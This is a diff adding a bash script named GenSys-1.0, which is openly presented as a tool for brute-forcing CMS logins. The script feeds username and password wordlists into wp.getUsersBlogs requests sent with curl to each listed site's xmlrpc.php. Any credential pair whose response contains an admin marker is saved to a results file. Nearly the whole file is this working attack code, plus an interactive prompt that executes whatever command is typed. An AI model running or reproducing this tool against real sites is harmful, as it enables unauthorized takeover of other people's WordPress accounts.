@@ -1,0 +1,185 @@
+#!/bin/system/bash
+#
+#
+#--> GenSys-1.0
+#--- // Coded by C4 x Ganest-Seven
+#--- // Bruteforcing some CMS
+#
+#
+red="\e[1;31m" ; gr="\e[1;32m" ; yl="\e[1;33m" ; bl="\e[1;34m"
+cy="\e[1;36m"  ; norm="\e[0m"  ; clear #-- Be Good people and don't recode
+#
+#
+#
+# * ------> BEGIN // Source code of GenSys-1.0
+#
+#
+#
+echo -e "
+>> GENSYS-1.0 // Coded by C4
+>> https://www.github.com/Demon-C4
+-- Try 'help' for more information
+"
+#
+#	; GenSys-1.0
+#
+#	; Total commandFunction	: 11;
+#	; dec.4 ; set.3 ; get.4
+#
+function get.Help() {
+echo -e "
+  GENSYS-0.1 TOOLKIT
+  ==================
+
+  Usage: <commandFunction> / <functionName>
+
+  CORE COMMANDS
+  =============
+
+    help\t\t\tShow this message and close
+    clear\t\t\tClear the terminal
+    exit\t\t\tExit this toolkit
+
+
+  DECLARE COMMANDS / dec
+  ======================
+
+   .inUser= <value>\t\tStart bruteforce with username = value
+   .byUser\t\t\tStart bruteforce with single target
+   .byUsers\t\t\tStart bruteforce sort by user-wordlist
+   .byURL\t\t\tStart bruteforce sort by url-wordlist
+
+
+   -- Example: dec.inUser("admin") , dec.byUsers
+
+
+  SETTING COMMANDS / set
+  ======================
+
+   .listUsers\t\t\tSetting file of password wordlist
+   .listPass\t\t\tSetting up file of username list
+   .listURL\t\t\tSetting Up filename of URL wordlist
+
+
+   -- Example: set.listPass(password.txt) , set.listUsers(admin.txt)
+
+
+  GET COMMANDS / get
+  ==================
+
+   .allOpt\t\t\tReturn info of all option setting
+   .listUsers\t\t\tReturn info file of wordlist (password)
+   .listPass\t\t\tReturn filename of username wordlist
+   .listURL\t\t\tReturn filename of website list
+
+
+  -- Example: get.ListPass , get.ListUser , get.ListURL
+
+"
+
+}
+function get.optAll (){
+ usr=$(cat tmp | grep "TEMP_DATA_LIST_USR" | awk '{print $5}')
+ pwd=$(cat tmp | grep "TEMP_DATA_LIST_PASS" | awk '{print $5}')
+ uri=$(cat tmp | grep "TEMP_DATA_LIST_URL" | awk '{print $5}')
+echo -e "
+ CURRENT OPTIONS
+ ===============
+
+  USERNAME LIST => $usr
+  PASSWORD LIST => $pwd
+  URL LIST      => $uri
+  REQ. TIMEOUT  => 5
+
+"
+}
+function gensys_declare_info (){
+	echo -e "$norm"
+	echo -e " |$gr AUTHENTICATION$norm\t\t: Correct username/password"
+	echo -e " |$red AUTHENTICATION$norm\t\t: Invalid username/password"
+	echo -e " |$gr TIMEOUT\t\t=> $max"
+}
+function dec.byUsers (){
+	usr="user-def"
+	pwd="pass-def"
+	result="result.txt"
+	url="def.txt"
+	max=5
+	printf "$bl [*]$norm Open and running the module...\n"
+	sleep 0.8
+	printf "$bl [+]$norm Declare => Xmlrpc Bruteforce \n"
+
+	gensys_declare_info
+
+	for user in $(cat $usr); do
+			for pass in $(cat $pwd); do
+				printf $norm
+				echo ""
+				echo " ======================================================"
+				echo -e " | GenSys-1.0 POST SORT LIST BY USERNAME |$bl $user:$pass$norm"
+				echo " ======================================================"
+				printf " | Please wait ...\r"
+				for i in $(cat $url); do
+						printf "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>${user}</string></value></param><param><value><string>${pass}</string></value></param></params></methodCall>" > data.txt
+						curl -s --max-time $max --compressed --data $(cat data.txt) $i/xmlrpc.php > xmlrpc.txt
+
+						if [[ $(cat xmlrpc.txt | grep "<name>isAdmin</name>") ]]
+						then
+							printf "$norm |$gr AUTHENTICATION$norm | $i/wp-login.php#$user:$pass$gr SAVED!\n"
+							printf "$i/wp-login.php#$user:$pass\n" >> $result
+						else
+							rm -f xmlrpc.txt && rm -f data.txt
+							printf "$norm |$red AUTHENTICATION$norm | $i\n"
+						fi
+				done
+			done
+		done
+}
+#
+#	 ; GenSys-1.0 by C4
+#
+#	 ; All commands actions     --> 02;
+#	 ; Total in current version --> 10;
+#	 ; Total commands of module --> 09;
+#
+#
+function command() {
+	while IFS= read -e -p $'\e[0m gensys\e[1;31m/~1.0\e[0m ~> ' cmd;
+	do
+		history -s "$cmd"
+		case $cmd in
+			"exit")
+			exit
+			;;
+			"")
+			command
+			;;
+			"clear")
+			clear && command
+			;;
+			"help")
+			get.Help && command
+			;;
+			*)
+			$cmd && command
+		esac
+	done
+}
+#
+#
+#
+# * <------ END // Source code of GenSys-1.0
+#
+#
+#
+command
+<<'END'
+
+ if you find any bug please contact me, C4.
+
+  -- I hope you enjoy with this small tool
+  -- I hope this tool can make you easier
+
+ Greetz for my team ("https://www.ganest-seven.com")
+
+'END'
